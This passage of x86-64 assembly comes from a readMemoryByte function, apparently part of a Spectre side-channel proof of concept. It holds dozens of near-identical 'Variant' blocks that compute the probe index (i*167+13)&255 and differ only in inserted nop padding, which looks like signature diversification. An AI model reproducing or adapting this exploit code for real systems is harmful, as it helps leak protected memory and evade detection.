	cmpl	$137, %eax
	je	.LreadMemoryByte_win5_var137
	cmpl	$138, %eax
	je	.LreadMemoryByte_win5_var138
	cmpl	$139, %eax
	je	.LreadMemoryByte_win5_var139
	cmpl	$140, %eax
	je	.LreadMemoryByte_win5_var140
	cmpl	$141, %eax
	je	.LreadMemoryByte_win5_var141
	cmpl	$142, %eax
	je	.LreadMemoryByte_win5_var142
	cmpl	$143, %eax
	je	.LreadMemoryByte_win5_var143
	cmpl	$144, %eax
	je	.LreadMemoryByte_win5_var144
	cmpl	$145, %eax
	je	.LreadMemoryByte_win5_var145
	cmpl	$146, %eax
	je	.LreadMemoryByte_win5_var146
	cmpl	$147, %eax
	je	.LreadMemoryByte_win5_var147
	cmpl	$148, %eax
	je	.LreadMemoryByte_win5_var148
	cmpl	$149, %eax
	je	.LreadMemoryByte_win5_var149
	jmp	.LreadMemoryByte_win5_var0
## Variant 0
.LreadMemoryByte_win5_var0:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 1
.LreadMemoryByte_win5_var1:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	nop
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 2
.LreadMemoryByte_win5_var2:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	nop
	addl	$13, %eax
	nop
	andl	$255, %eax
	nop
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 3
.LreadMemoryByte_win5_var3:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	nop
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	nop
	movl	-68(%rbp), %eax
	nop
	jmp	.LreadMemoryByte_win5_continue
## Variant 4
.LreadMemoryByte_win5_var4:
	popq	%rax
	nop
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	nop
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 5
.LreadMemoryByte_win5_var5:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	nop
	jmp	.LreadMemoryByte_win5_continue
## Variant 6
.LreadMemoryByte_win5_var6:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	nop
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 7
.LreadMemoryByte_win5_var7:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	nop
	nop
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 8
.LreadMemoryByte_win5_var8:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	nop
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	nop
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 9
.LreadMemoryByte_win5_var9:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	nop
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	nop
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 10
.LreadMemoryByte_win5_var10:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	nop
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	nop
	movl	-68(%rbp), %eax
	nop
	jmp	.LreadMemoryByte_win5_continue
## Variant 11
.LreadMemoryByte_win5_var11:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	nop
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 12
.LreadMemoryByte_win5_var12:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_25
	nop
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 13
.LreadMemoryByte_win5_var13:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 14
.LreadMemoryByte_win5_var14:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
	nop
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 15
.LreadMemoryByte_win5_var15:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	nop
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	nop
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 16
.LreadMemoryByte_win5_var16:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	nop
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 17
.LreadMemoryByte_win5_var17:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	nop
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 18
.LreadMemoryByte_win5_var18:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
	nop
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	nop
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 19
.LreadMemoryByte_win5_var19:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	nop
	movl	%eax, -68(%rbp)
	nop
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 20
.LreadMemoryByte_win5_var20:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 21
.LreadMemoryByte_win5_var21:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 22
.LreadMemoryByte_win5_var22:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	nop
	nop
	nop
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 23
.LreadMemoryByte_win5_var23:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
	nop
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	nop
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 24
.LreadMemoryByte_win5_var24:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	nop
	nop
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 25
.LreadMemoryByte_win5_var25:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	nop
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	nop
	movl	-68(%rbp), %eax
	nop
	jmp	.LreadMemoryByte_win5_continue
## Variant 26
.LreadMemoryByte_win5_var26:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	nop
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 27
.LreadMemoryByte_win5_var27:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	nop
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 28
.LreadMemoryByte_win5_var28:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	nop
	jmp	.LreadMemoryByte_win5_continue
## Variant 29
.LreadMemoryByte_win5_var29:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	nop
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	nop
	jmp	.LreadMemoryByte_win5_continue
## Variant 30
.LreadMemoryByte_win5_var30:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	nop
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	nop
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 31
.LreadMemoryByte_win5_var31:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	nop
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 32
.LreadMemoryByte_win5_var32:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	nop
	nop
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 33
.LreadMemoryByte_win5_var33:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
	nop
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	nop
	andl	$255, %eax
	nop
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 34
.LreadMemoryByte_win5_var34:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	nop
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 35
.LreadMemoryByte_win5_var35:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	nop
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	nop
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 36
.LreadMemoryByte_win5_var36:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	nop
	nop
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 37
.LreadMemoryByte_win5_var37:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 38
.LreadMemoryByte_win5_var38:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	nop
	nop
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 39
.LreadMemoryByte_win5_var39:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
	nop
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	nop
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	nop
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 40
.LreadMemoryByte_win5_var40:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	nop
	nop
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	nop
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 41
.LreadMemoryByte_win5_var41:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 42
.LreadMemoryByte_win5_var42:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	nop
	nop
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 43
.LreadMemoryByte_win5_var43:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	nop
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	nop
	andl	$255, %eax
	nop
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 44
.LreadMemoryByte_win5_var44:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	nop
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 45
.LreadMemoryByte_win5_var45:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_25
	nop
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	nop
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 46
.LreadMemoryByte_win5_var46:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	nop
	andl	$255, %eax
	nop
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	nop
	jmp	.LreadMemoryByte_win5_continue
## Variant 47
.LreadMemoryByte_win5_var47:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	nop
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 48
.LreadMemoryByte_win5_var48:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	nop
	movl	-68(%rbp), %eax
	nop
	nop
	jmp	.LreadMemoryByte_win5_continue
## Variant 49
.LreadMemoryByte_win5_var49:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
	nop
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	nop
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 50
.LreadMemoryByte_win5_var50:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
	nop
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 51
.LreadMemoryByte_win5_var51:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
	nop
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	nop
	nop
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 52
.LreadMemoryByte_win5_var52:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	nop
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 53
.LreadMemoryByte_win5_var53:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	nop
	nop
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 54
.LreadMemoryByte_win5_var54:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	nop
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	nop
	jmp	.LreadMemoryByte_win5_continue
## Variant 55
.LreadMemoryByte_win5_var55:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
	nop
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	nop
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 56
.LreadMemoryByte_win5_var56:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	nop
	jge	LBB1_25
	nop
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 57
.LreadMemoryByte_win5_var57:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	nop
	nop
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 58
.LreadMemoryByte_win5_var58:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	nop
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	nop
	jmp	.LreadMemoryByte_win5_continue
## Variant 59
.LreadMemoryByte_win5_var59:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	nop
	nop
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 60
.LreadMemoryByte_win5_var60:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	nop
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	nop
	jmp	.LreadMemoryByte_win5_continue
## Variant 61
.LreadMemoryByte_win5_var61:
	popq	%rax
	nop
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	nop
	addl	$13, %eax
	nop
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 62
.LreadMemoryByte_win5_var62:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	nop
	nop
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 63
.LreadMemoryByte_win5_var63:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	nop
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 64
.LreadMemoryByte_win5_var64:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	nop
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	nop
	addl	$13, %eax
	andl	$255, %eax
	nop
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 65
.LreadMemoryByte_win5_var65:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	nop
	addl	$13, %eax
	nop
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	nop
	jmp	.LreadMemoryByte_win5_continue
## Variant 66
.LreadMemoryByte_win5_var66:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	nop
	nop
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 67
.LreadMemoryByte_win5_var67:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	nop
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	jmp	.LreadMemoryByte_win5_continue
## Variant 68
.LreadMemoryByte_win5_var68:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	imull	$167, -56(%rbp), %eax
	nop
	addl	$13, %eax
	nop
	andl	$255, %eax
	movl	%eax, -68(%rbp)
	movl	-68(%rbp), %eax
	nop
	jmp	.LreadMemoryByte_win5_continue
## Variant 69
.LreadMemoryByte_win5_var69:
	popq	%rax
	cmpl	$256, -56(%rbp)    # # imm = 0x100
	jge	LBB1_25
## %bb.20:                              ##   in Loop: Header=BB1_19 Depth=2
	nop
	imull	$167, -56(%rbp), %eax
	addl	$13, %eax
	andl	$255, %eax
